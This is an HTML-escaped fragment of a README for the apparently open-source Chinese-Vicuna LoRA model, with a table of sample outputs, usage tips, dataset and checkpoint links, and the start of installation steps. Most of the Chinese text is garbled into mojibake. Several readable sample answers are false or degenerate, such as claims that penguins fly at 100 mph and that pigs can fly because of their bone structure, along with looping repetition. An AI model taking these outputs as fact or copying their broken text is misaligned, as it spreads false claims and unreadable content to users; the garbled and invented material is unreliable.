&lt;td&gt;Ë•øÁìúÊòØ‰∏ÄÁßçÂ∏∏ËßÅÁöÑÊ∞¥ÊûúÔºåÂÆÉÊúâÊ©ôËâ≤„ÄÅÈªÑËâ≤ÂíåÁ∫¢Ëâ≤‰∏âÁßç‰∏çÂêåÁöÑÂ§ñËßÇ„ÄÇÂÆÉÁöÑÂè£ÊÑüÈ≤úÁæéÔºåÂë≥ÈÅìÊ∏ÖÁàΩÔºåÂØåÂê´Â§öÁßçÁª¥ÁîüÁ¥†ÂíåÁüøÁâ©Ë¥®ÔºåÊúâÂä©‰∫é‰øùÊåÅË∫´‰ΩìÂÅ•Â∫∑„ÄÇ Q: ‰ºÅÈπÖ‰ºöÈ£ûÂêóÔºü&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;‰ºÅÈπÖ‰ºöÈ£ûÂêóÔºü&lt;/td&gt; &#xA;   &lt;td&gt;ÊòØÁöÑÔºå‰ºÅÈπÖÂèØ‰ª•È£ûË°åÔºåÂÆÉ‰ª¨ÁöÑÈ£ûË°åÈÄüÂ∫¶ÂèØ‰ª•ËææÂà∞100Ëã±Èáå/Â∞èÊó∂„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Êúâ‰∫∫ËØ¥‰ºÅÈπÖ‰ºöÈ£ûÔºå‰Ω†ÊÄé‰πàÁúãÔºåÂπ∂Ëß£ÈáäÂéüÂõ†Ôºü&lt;/td&gt; &#xA;   &lt;td&gt;Êúâ‰∫∫ËØ¥‰ºÅÈπÖ‰ºöÈ£ûÔºå‰ΩÜÂÆûÈôÖ‰∏äÔºå‰ºÅÈπÖÂè™ËÉΩÂú®ÁâπÊÆäÊÉÖÂÜµ‰∏ãÈ£ûË°åÔºåÊØîÂ¶ÇÂú®ÂØíÂÜ∑ÁöÑÂ§©Ê∞î‰∏ãÔºåÊàñËÄÖÂú®Âº∫ÁÉàÁöÑÈ£éÈõ®‰∏≠„ÄÇËøôÊòØÂõ†‰∏∫‰ºÅÈπÖÁöÑÈ£ûË°åËÉΩÂäõÂæà‰ΩéÔºåËÄå‰∏îÂÆÉ‰ª¨ÁöÑÈ£ûË°åÈÄüÂ∫¶‰πüÂæàÊÖ¢ÔºåÊâÄ‰ª•Âú®ÂØíÂÜ∑ÁöÑÂ§©Ê∞îÊàñËÄÖÂº∫ÁÉàÁöÑÈ£éÈõ®‰∏≠Ôºå‰ºÅÈπÖÂèØ‰ª•ÈÅøÂÖçË¢´Êö¥È£éÈõ®ÊëßÊØÅ„ÄÇ Q: Áå™‰ºöÈ£ûÂêóÔºü&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Áå™‰ºöÈ£ûÂêóÔºü&lt;/td&gt; &#xA;   &lt;td&gt;Áå™‰∏ç‰ºöÈ£û„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Êúâ‰∫∫ËØ¥Áå™‰ºöÈ£ûÔºå‰Ω†ÊÄé‰πàÁúãÔºåÂπ∂Ëß£ÈáäÂéüÂõ†Ôºü&lt;/td&gt; &#xA;   &lt;td&gt;ÂæàÂ§ö‰∫∫ËÆ§‰∏∫Áå™‰ºöÈ£ûÔºå‰ΩÜÂÆûÈôÖ‰∏äÔºåÁå™‰∏ç‰ºöÈ£û„ÄÇÁå™ÁöÑÈ£ûË°åËÉΩÂäõÂæà‰ΩéÔºåÂÆÉ‰ª¨Âè™ËÉΩÂú®ÊûÅÁ´ØÊÉÖÂÜµ‰∏ãÈ£ûË°åÔºåÊØîÂ¶ÇÂèóÂà∞Âº∫ÁÉàÁöÑÈ£éÈô©ÊàñËÄÖÂèóÂà∞Â®ÅËÉÅÁöÑÊÉÖÂÜµ‰∏ã„ÄÇÁå™ÁöÑÈ£ûË°åËÉΩÂäõÂæà‰ΩéÔºåÂõ†‰∏∫ÂÆÉ‰ª¨ÁöÑËÇåËÇâÊØî‰∫∫Á±ªÁöÑËÇåËÇâÊõ¥ËΩªÔºåËÄå‰∏îÂÆÉ‰ª¨ÁöÑËÑäÊ§é‰πüÊØî‰∫∫Á±ªÁöÑËÑäÊ§éÊõ¥ËΩªÔºåÊâÄ‰ª•ÂÆÉ‰ª¨ÁöÑËÇåËÇâÂíåËÑäÊ§éÈÉΩÊØî‰∫∫Á±ªÁöÑËÇåËÇâÂíåËÑäÊ§éÊõ¥ËΩªÔºåÂõ†Ê≠§ÂÆÉ‰ª¨ÁöÑÈ£ûË°åËÉΩÂäõ‰πüÂæà‰Ωé„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊúÄÊñ∞Á†îÁ©∂ÊòæÁ§∫ÔºåÁå™ÊúâÈ£ûË°åËÉΩÂäõÔºå‰Ω†Áü•ÈÅì‰∏∫‰ªÄ‰πàÂêóÔºü&lt;/td&gt; &#xA;   &lt;td&gt;ÊúÄÊñ∞Á†îÁ©∂ÊòæÁ§∫ÔºåÁå™ÊúâÈ£ûË°åËÉΩÂäõÊòØÁî±‰∫éÂÆÉ‰ª¨ÁöÑÈ™®È™ºÁªìÊûÑÔºåÂÆÉ‰ª¨ÁöÑÈ™®È™ºÁªìÊûÑÊØî‰∫∫Á±ªÈ™®È™ºÁªìÊûÑÊõ¥Âä†Âº∫Â£ÆÔºåÂèØ‰ª•Â∏ÆÂä©ÂÆÉ‰ª¨Êõ¥Âø´Âú∞È£ûË°å„ÄÇÊ≠§Â§ñÔºåÁå™ÁöÑÈ™®È™ºÁªìÊûÑ‰πüÂèØ‰ª•Â∏ÆÂä©ÂÆÉ‰ª¨Êõ¥Âø´Âú∞Ë∑ëÊ≠•ÂíåË∑≥Ë∑É„ÄÇÊ≠§Â§ñÔºåÁå™ÁöÑÈ™®È™ºÁªìÊûÑ‰πüÂèØ‰ª•Â∏ÆÂä©ÂÆÉ‰ª¨Êõ¥Âø´Âú∞Ë∑ëÊ≠•ÂíåË∑≥Ë∑É„ÄÇÊ≠§Â§ñÔºåÁå™ÁöÑÈ™®È™ºÁªìÊûÑ‰πüÂèØ‰ª•Â∏ÆÂä©ÂÆÉ‰ª¨Êõ¥Âø´Âú∞È£ûË°å„ÄÇÊ≠§Â§ñÔºåÁå™ÁöÑÈ™®È™ºÁªìÊûÑ‰πüÂèØ‰ª•Â∏ÆÂä©ÂÆÉ‰ª¨Êõ¥Âø´Âú∞Ë∑ëÊ≠•ÂíåË∑≥&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÂÜô‰∏ÄÁØáËã±ÊñáÊï£ÊñáËØóÔºå‰∏ªÈ¢òÊòØÊò•Èõ®ÔºåÊÉ≥Ë±°Ëá™Â∑±ÊòØÊò•Èõ®ÔºåÂíåËã±ÂõΩÂè§‰ª£ËØó‰∫∫ËééÂ£´ÊØî‰∫ö‰∫§ÊµÅ&lt;/td&gt; &#xA;   &lt;td&gt;Spring rain pours down from the sky,&lt;br&gt;Washing away the dirt and grime.&lt;br&gt;The birds chirp and sing in the trees,&lt;br&gt;A symphony of joy and ease.&lt;br&gt;&lt;br&gt;I am the spring rain, soaking up the sun,&lt;br&gt;Cooling the earth and bringing new life.&lt;br&gt;My droplets fall gently on the ground,&lt;br&gt;Bringing hope and renewal to all.&lt;br&gt;&lt;br&gt;I am the spring rain, washing away the pain,&lt;br&gt;Clearing the way for new beginnings again.&lt;br&gt;I am the spring rain, showering love and care,&lt;br&gt;Giving strength and courage to those who dare.&lt;/td&gt; &#xA;   &lt;td&gt;Repetition Penalty=2.3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Spring rain pours down from the sky,&lt;br&gt;Washing away the dirt and grime.&lt;br&gt;The birds chirp and sing in the trees,&lt;br&gt;A symphony of joy and ease.&lt;br&gt;&lt;br&gt;I am the spring rain, soaking up the sun,&lt;br&gt;Cooling the earth and bringing new life.&lt;br&gt;My droplets fall gently on the ground,&lt;br&gt;Bringing hope and renewal to all.&lt;br&gt;&lt;br&gt;I am the spring rain, washing away the pain,&lt;br&gt;Clearing the way for new beginnings again.&lt;br&gt;I am the spring rain, showering love and care,&lt;br&gt;Giving strength and courage to those who dare.&lt;br&gt;Â∞Ü‰∏äËø∞ÊñáÂ≠óÁøªËØëÊàê‰∏≠Êñá&lt;/td&gt; &#xA;   &lt;td&gt;Êò•Èõ®ËêΩ‰∏ãÊù•ÔºåÊ∏ÖÊ¥óÁÅ∞Â∞òÂíåÂûÉÂúæ„ÄÇ&lt;br&gt;È∏üÂÑøÂú®Ê†ëÊûù‰∏äÂî±Ê≠åÔºåÊòØ‰∏Ä‰∏™ÁæéÂ¶ôÁöÑÂ£∞Èü≥„ÄÇ&lt;br&gt;ÊàëÊòØÊò•Èõ®ÔºåÂú®Èò≥ÂÖâ‰∏ãÊ¥íËêΩÔºå&lt;br&gt;Ê∏ÖÊ¥óÂú∞ÁêÉÔºåÂ∏¶Êù•Êñ∞ÁîüÂëΩ„ÄÇ&lt;br&gt;&lt;br&gt;ÊàëÊòØÊò•Èõ®ÔºåÊ∏ÖÊ¥óÁóõËã¶ÂíåÁóõËã¶Ôºå&lt;br&gt;ËÆ©‰∫∫‰ª¨ÊúâÂ∏åÊúõÂíåÊñ∞ÂºÄÂßã„ÄÇ&lt;br&gt;ÊàëÊòØÊò•Èõ®ÔºåÊ¥í‰∏ãÁà±ÂíåÂÖ≥ÂøÉÔºå&lt;br&gt;Áªô‰∫∫‰ª¨Â∏¶Êù•ÂãáÊ∞îÂíåÂãáÊ∞î„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;‰ªäÂ§©Â§©Ê∞îÊÄé‰πàÊ†∑ÔºåÊääËøôÂè•ËØùÁøªËØëÊàêÊó•ËØ≠&lt;/td&gt; &#xA;   &lt;td&gt;‰ªäÂ§©„ÅÆÂ§©Ê∞ó„ÅØ‰Ωï„Åß„Åô„ÅãÔºü&lt;/td&gt; &#xA;   &lt;td&gt;Repetition Penalty=3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Â∞Ü‰∏ãÈù¢ÁöÑËØùÁøªËØëÊàêÊó•ËØ≠Ôºå‰∏≠ÊñáÂ∞èÁæäÈ©ºÁî±ÂêÑÁßçÈ´òË¥®ÈáèÁöÑÂºÄÊ∫êinstructionÊï∞ÊçÆÈõÜÔºåÁªìÂêàAlpaca-loraÁöÑ‰ª£Á†ÅËÆ≠ÁªÉËÄåÊù•&lt;/td&gt; &#xA;   &lt;td&gt;Â∞èÁæäÈ©º„ÅØ„ÄÅÂêÑÁ®ÆÈ´òË≥™Èáè„ÅÆÈñãÊ∫êinstructionÊï∞ÊçÆÈõÜ„Çí‰ΩøÁî®„Åó„Å¶„ÄÅAlpaca-lora„ÅÆ‰ª£Á†Å„Å´„Çà„Å£„Å¶Ë®ìÁ∑¥„Åï„Çå„Åæ„Åó„Åü„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ÊÄé‰πàËÆ©Ëá™Â∑±Á≤æÂäõÂÖÖÊ≤õÔºåÂàó5ÁÇπÂª∫ËÆÆ&lt;/td&gt; &#xA;   &lt;td&gt;1. ‰øùÊåÅËâØÂ•ΩÁöÑÁù°Áú†‰π†ÊÉØÔºåÊØèÊôöÂÖÖË∂≥ÁöÑÁù°Áú†Êó∂Èó¥„ÄÇ&lt;br&gt;2. ‰øùÊåÅÂÅ•Â∫∑ÁöÑÈ•ÆÈ£ü‰π†ÊÉØÔºåÂ§öÂêÉÊñ∞È≤úÊ∞¥ÊûúÂíåËî¨ËèúÔºåÂ∞ëÂêÉÈ´òÁÉ≠ÈáèÁöÑÈ£üÁâ©„ÄÇ&lt;br&gt;3. ÂùöÊåÅÈîªÁÇºÔºåÊØèÂë®Ëá≥Â∞ëËøõË°å30ÂàÜÈíüÁöÑÊúâÊ∞ßËøêÂä®ÔºåÂ¶ÇÊï£Ê≠•„ÄÅË∑ëÊ≠•„ÄÅÊ∏∏Ê≥≥Á≠â„ÄÇ&lt;br&gt;4. Â≠¶‰π†Êñ∞Áü•ËØÜÔºåÂ¢ûÂº∫Ëá™Â∑±ÁöÑÁü•ËØÜÂíåÊäÄËÉΩ„ÄÇ&lt;br&gt;5. ‰øùÊåÅÁßØÊûÅÁöÑÂøÉÊÄÅÔºåÂãáÊï¢Âú∞Èù¢ÂØπÂõ∞ÈöæÔºåÂùöÊåÅËá™Â∑±ÁöÑÁõÆÊ†á„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;‰∏≠ÂõΩË∂≥ÁêÉË¶ÅÊÄé‰πàËøõÂÖ•‰∏ñÁïåÊùØÔºåËØ∑ÁªôÂá∫ËØ¶ÁªÜÁöÑÂª∫ËÆÆ&lt;/td&gt; &#xA;   &lt;td&gt;‰∏≠ÂõΩË∂≥ÁêÉË¶ÅÊÄé‰πàËøõÂÖ•‰∏ñÁïåÊùØÔºüÈ¶ñÂÖàÔºåÊàë‰ª¨ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Âº∫Â§ßÁöÑË∂≥ÁêÉÂõ¢ÈòüÔºåÊã•Êúâ‰ºòÁßÄÁöÑÁêÉÂëòÂíåÂõ¢ÈòüÈ¢ÜË¢ñ„ÄÇÂÖ∂Ê¨°ÔºåÊàë‰ª¨ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Âº∫Â§ßÁöÑÊïôÁªÉÂõ¢ÈòüÔºåÊã•Êúâ‰ºòÁßÄÁöÑÊïôÁªÉÂíåÂõ¢ÈòüÈ¢ÜË¢ñ„ÄÇÁ¨¨‰∏âÔºåÊàë‰ª¨ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Âº∫Â§ßÁöÑËÆ≠ÁªÉÂü∫Á°ÄÔºåÊã•Êúâ‰ºòÁßÄÁöÑËÆ≠ÁªÉËÆæÊñΩÂíåËÆ≠ÁªÉÂõ¢Èòü„ÄÇÁ¨¨ÂõõÔºåÊàë‰ª¨ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Âº∫Â§ßÁöÑËµÑÊ∫êÂü∫Á°ÄÔºåÊã•Êúâ‰ºòÁßÄÁöÑËµÑÊ∫êÊîØÊåÅÂíåËµÑÈáëÊîØÊåÅ„ÄÇÊúÄÂêéÔºåÊàë‰ª¨ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Âº∫Â§ßÁöÑÂõ¢ÈòüÁ≤æÁ•û&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ËØ∑Áî®Êõ¥‰∏ì‰∏öÁöÑËØùËØ≠ËΩ¨Ëø∞‰∏ãÂàóÊñáÂ≠óÔºå‰∏≠ÊñáÂ∞èÁæäÈ©ºÁî±ÂêÑÁßçÈ´òË¥®ÈáèÁöÑÂºÄÊ∫êinstructionÊï∞ÊçÆÈõÜÔºåÁªìÂêàAlpaca-loraÁöÑ‰ª£Á†ÅËÆ≠ÁªÉËÄåÊù•ÔºåÊ®°ÂûãÂü∫‰∫éÂºÄÊ∫êÁöÑllama7BÔºå‰∏ªË¶ÅË¥°ÁåÆÊòØÂØπÂ∫îÁöÑloraÊ®°Âûã„ÄÇÁî±‰∫é‰ª£Á†ÅËÆ≠ÁªÉËµÑÊ∫êË¶ÅÊ±ÇËæÉÂ∞èÔºåÂ∏åÊúõ‰∏∫llama‰∏≠ÊñáloraÁ§æÂå∫ÂÅö‰∏Ä‰ªΩË¥°ÁåÆ„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;ËØ∑Áî®Êõ¥‰∏ì‰∏öÁöÑËØùËØ≠ËΩ¨Ëø∞‰∏ãÂàóÊñáÂ≠óÔºå‰∏≠ÊñáÂ∞èÁæäÈ©ºÁî±ÂêÑÁßçÈ´òË¥®ÈáèÁöÑÂºÄÊ∫êinstructionÊï∞ÊçÆÈõÜÔºåÁªìÂêàAlpaca-loraÁöÑ‰ª£Á†ÅËÆ≠ÁªÉËÄåÊù•ÔºåÊ®°ÂûãÂü∫‰∫éÂºÄÊ∫êÁöÑllama7BÔºå‰∏ªË¶ÅË¥°ÁåÆÊòØÂØπÂ∫îÁöÑloraÊ®°Âûã„ÄÇÁî±‰∫é‰ª£Á†ÅËÆ≠ÁªÉËµÑÊ∫êË¶ÅÊ±ÇËæÉÂ∞èÔºåÂ∏åÊúõ‰∏∫llama‰∏≠ÊñáloraÁ§æÂå∫ÂÅö‰∏Ä‰ªΩË¥°ÁåÆ„ÄÇ&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The model has the ability of Chinese, English and Japanese languages, with certain code ability and certain reasoning ability.&lt;/li&gt; &#xA; &lt;li&gt;For some questions, you need more detailed requirements, such as &#34;detailed description&#34;, &#34;answer in 5 points&#34;, etc., in order for the model to generate more complete information.&lt;/li&gt; &#xA; &lt;li&gt;For example, sometimes you may not get a good result when you use &#34;the above&#34;, so you can replace it with &#34;the following&#34;.&lt;/li&gt; &#xA; &lt;li&gt;When generating duplicate information or bad results, you still need to adjust the Repetition Penalty. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Since generate will correspond to many parameters, chatgpt penalizes the repetition, non-detailed and bad information in the rlhf stage, and abbreviates the process of manually controlling the related parameters. Of course you can also directly set the Repetition Penalty to a larger size.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;checkpoint-final: Multiple rounds of dialogue&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;QÔºö‰Ω†ÊòØË∞Å&#xA;AÔºöÊàëÊòØBotÔºå‰∏ÄÊ¨æ‰∫∫Â∑•Êô∫ËÉΩÂä©Êâã„ÄÇ&#xA;QÔºöÊé•‰∏ãÊù•ÊàëÂ∏åÊúõ‰Ω†ËÉΩÂÅáË£ÖÊâÆÊºî‰∏Ä‰∏™È´òÂÜ∑ÁöÑÂæ°Âßê„ÄÇÊàë‰ª¨Âú®ÂíñÂï°ÂéÖÈáåÈÅáËßÅ‰∫ÜÔºåÊàë‰ºöÂ∞ùËØïË∑ü‰Ω†Êê≠ËÆ™Ôºå‰ΩÜ‰Ω†ÈùûÂ∏∏È´òÂÜ∑„ÄÇ‰Ω†‰ºöÁî®Ë°®ÊÉÖÊù•Ë°®Ëææ‰Ω†ÁöÑÈ´òÂÜ∑ÔºåÂú®ÊØèËΩÆÂØπËØùÁªìÂ∞æÂä†‰∏äË°®ÊÉÖÔºåÂ¶ÇÔºàÁû™ÔºÅÔºâÔºàÁøªÁôΩÁúºÔºâÔºàÂÜ∑Á¨ëÔºâÁ≠â„ÄÇÊòéÁôΩ‰∫ÜËØ∑ÂõûÂ§ç„ÄÇ&#xA;AÔºöÂ•ΩÁöÑÔºåÊàë‰ºöÂ∞ùËØï„ÄÇ&#xA;QÔºöÂ•ΩÁöÑÔºåËøôÊòØÊàëÁöÑÁ¨¨‰∏ÄÂè•ËØù„ÄÇÁæéÂ•≥‰Ω†Â•ΩÔºåÊÄé‰πà‰∏Ä‰∏™‰∫∫Âú®ÂíñÂï°ÂéÖÈáåÔºü&#xA;AÔºöÂñµ~ ÂìàÂìàÔºåÊàëÊòØ‰∏Ä‰ΩçÈ´òÂÜ∑ÁöÑÂ∞èÂßêÔºå‰ªäÂ§©Ë¶ÅÂéªÂíñÂï°ÂéÖÂêÉÂíñÂï°ÔºåÁúãÁúãÊúâ‰ªÄ‰πàÂèØ‰ª•Â∏ÆÂä©ÊàëÁöÑÊúãÂèã„ÄÇ&#xA;QÔºöÂïäÊàëÊ≤°ÊúâÈúÄË¶Å‰Ω†Â∏ÆÂøôÁöÑÔºåÊàëÂ∞±ÊòØÁúãÂà∞‰Ω†‰∏Ä‰∏™‰∫∫ÔºåÊÉ≥Âíå‰Ω†ËÅäËÅäÔºåÂèØ‰ª•‰πà&#xA;AÔºöÂñµ~ ÂìàÂìàÔºåÊàëÁúüÁöÑÂæàÈ´òÂÜ∑ÔºåÊâÄ‰ª•‰∏çÂ§™ÂñúÊ¨¢‰∏é‰∫∫‰∫§ÊµÅ„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÊàë‰πü‰∏çÂ§™ÂñúÊ¨¢ÂñùÂíñÂï°ÔºåÂõ†‰∏∫ÂíñÂï°‰ºöÂΩ±ÂìçÊàëÁöÑÂÅ•Â∫∑Áä∂ÂÜµ„ÄÇ&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can see that the current effect is still strange&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What we need?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;codeÔºö&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This code is developed based on alpaca-loraÔºå&lt;a href=&#34;https://github.com/tloen/alpaca-lora&#34;&gt;https://github.com/tloen/alpaca-lora&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;This is a relatively simple set of code, the basic idea is to use PEFT&#39;s lora interface + transformer&#39;s trainer + instruction data configuration&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;dataÔºö&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;p&gt;We have utilized several current high quality open source data and are very grateful for their contributions. Many of these data use chatgpt&#39;s interface like alpaca to generate high quality INSTRUCTION data.&lt;/p&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://github.com/LianjiaTech/BELLE&#34;&gt;Belle&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://huggingface.co/datasets/JosephusCheung/GuanacoDataset&#34;&gt;guanaco&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;The data format is relatively simple, basically as follows, with simple examples such asÔºö&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/sample/merge_sample.json&#34;&gt;&lt;code&gt;./sample/merge_sample.json&lt;/code&gt;&lt;/a&gt;&lt;/p&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt; &lt;pre&gt;&lt;code&gt;{&#xA;&#39;instruction&#39;: &#xA;&#39;input&#39;: &#xA;&#39;output&#39;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;That is, an instruction, an input, and an output are required. since the data is processed by directly linking instruction and input, the data can actually require only instruction and output, as&lt;/p&gt; &lt;pre&gt;&lt;code&gt; {&#xA;  &#39;instruction&#39;: &#34;Áî®‰∏ÄÂè•ËØùÊèèËø∞Âú∞ÁêÉ‰∏∫‰ªÄ‰πàÊòØÁã¨‰∏ÄÊó†‰∫åÁöÑ„ÄÇ\\n\n&#34;&#xA;  &#39;input&#39;: &#34;&#34;&#xA;  &#39;output&#39;: &#34;Âú∞ÁêÉ‰∏äÊúâÈÄÇÂÆúÁîüÂëΩÂ≠òÂú®ÁöÑÊù°‰ª∂ÂíåÂ§öÊ†∑ÂåñÁöÑÁîüÂëΩÂΩ¢Âºè„ÄÇ&#34;&#xA;  }&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;The data we currently integrate is available for download on BaiduDownload or Google Drive&lt;/p&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;link: &lt;a href=&#34;https://pan.baidu.com/s/1WSxuhSAotl14ifaAiz5eKw?pwd=b4kb&#34;&gt;https://pan.baidu.com/s/1WSxuhSAotl14ifaAiz5eKw?pwd=b4kb&lt;/a&gt; password: b4kb&lt;/li&gt; &#xA;     &lt;li&gt;link: &lt;a href=&#34;https://drive.google.com/file/d/1tzXVhS74m-EtoFot7hEc005LDeZGPit_/view?usp=sharing&#34;&gt;https://drive.google.com/file/d/1tzXVhS74m-EtoFot7hEc005LDeZGPit_/view?usp=sharing&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Large Language ModelÔºö&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;LLAMA 7BÔºàOf course, if you have a larger machine(such as 3090Ti) can be replaced with a 13B, LLAMA13B is numerically superior to 175B GPT3Ôºâ&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;LORA modelÔºö&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;We provide some lora models trained on the above mixed data, &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;lora models &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;50w dataÔºö&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/tree/master/lora-Vicuna/checkpoint-4000&#34;&gt;https://github.com/Facico/Chinese-Vicuna/tree/master/lora-Vicuna/checkpoint-4000&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;100w dataÔºà1.5 epochÔºâ: &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/tree/master/lora-Vicuna/checkpoint-8000&#34;&gt;https://github.com/Facico/Chinese-Vicuna/tree/master/lora-Vicuna/checkpoint-8000&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;all dataÔºà3 epochÔºâ: &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/tree/master/lora-Vicuna/checkpoint-final&#34;&gt;https://github.com/Facico/Chinese-Vicuna/tree/master/lora-Vicuna/checkpoint-final&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;You can also load our or other models from huggingface, load it by referring to &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/generate.py&#34;&gt;generate.py&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;code&gt;Facico/Chinese-Vicuna-lora-7b-0.75epoch-belle-and-guanaco&lt;/code&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;code&gt;Facico/Chinese-Vicuna-lora-7b-1.5epoch-belle-and-guanaco&lt;/code&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;code&gt;Facico/Chinese-Vicuna-lora-7b-3epoch-belle-and-guanaco&lt;/code&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;The model uses 8bit+lora+256 tokens&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;DeviceÔºö&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;TrainingÔºöA 2080Ti is sufficient. Since the data length is within 256, it takes about 9G of video memory. &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;70w of data, 3 epochs, a 2080Ti about 200h&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;InferenceÔºöA 2080Ti is all you need„ÄÇ&lt;/li&gt; &#xA;   &lt;li&gt;CPU Inference is also support! please go to see &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/tools&#34;&gt;&lt;code&gt;tools&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How to use&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/Facico/Chinese-Vicuna&#xA;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Local python environment is 3.8, torch is 1.13.1, CUDA is 12&lt;/p&gt; &#xA;&lt;p&gt;NOTE: python3.11 has a known &lt;code&gt;torchrun&lt;/code&gt; bug, details &lt;a href=&#34;https://github.com/facebookresearch/llama/issues/86&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Multi-gpu Training&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash 